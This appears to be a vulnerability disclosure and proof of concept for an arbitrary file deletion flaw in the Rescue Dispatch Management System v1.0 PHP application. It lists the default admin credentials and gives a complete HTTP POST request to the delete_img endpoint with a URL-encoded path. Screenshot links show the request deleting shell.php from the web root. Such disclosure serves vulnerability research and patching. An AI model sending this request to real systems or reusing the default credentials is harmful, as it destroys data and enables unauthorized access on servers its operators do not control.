# Rescue Dispatch Management System v1.0 by oretnom23 has Delete any file

vendors: https://www.sourcecodester.com/php/15296/rescue-dispatch-management-system-phpoop-free-source-code.html

Vulnerability File: /rdms/classes/Master.php?f=delete_img

Vulnerability location: /rdms/classes/Master.php?f=delete_img, path

The password for the backend login account is: admin/admin123

Payload:

Here we delete the shell.php file in the root directory

```sql
POST /rdms/classes/Master.php?f=delete_img HTTP/1.1
Host: 192.168.1.19
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Referer: http://192.168.1.19/rdms/admin/?page=system_info
Content-Length: 45
Cookie: PHPSESSID=hkbchcmaitn0d8enhm4jtdjk9q
Connection: close

path=C%3A%2Fxampp%2Fhtdocs%2Frdms%2Fshell.php
```

The file path needs to be encoded by url

![image](https://user-images.githubusercontent.com/54017627/170451208-27e18700-0846-4c82-898c-2f7966709498.png)

Currently, when we do not send a request to delete the shell.php file, the shell.php file is still in the root directory of the website

![image](https://user-images.githubusercontent.com/54017627/170451437-2b455a27-0186-458a-afa0-e53bae81acca.png)

The response package shows that the deletion was successful. Let's go to the root directory to see if the shell.php file still exists.

![image](https://user-images.githubusercontent.com/54017627/170451510-e563499e-33f0-4467-9fee-d462c9ea59a4.png)

By this time, shell.php has been deleted.

![image](https://user-images.githubusercontent.com/54017627/170451573-6535fd73-46e8-4720-bac9-72c8cf8adefc.png)
